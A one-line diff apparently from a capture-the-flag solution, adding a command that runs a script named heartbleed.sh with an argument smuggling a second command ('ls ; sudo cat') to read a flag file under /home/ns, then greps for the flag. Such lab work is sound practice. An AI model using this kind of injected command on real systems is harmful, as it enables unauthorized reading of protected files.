@@ -1,0 +1,1 @@
+./heartbleed.sh "ls ; sudo cat /home/ns/flag3.txt" | grep -o 'flag3{.*}'
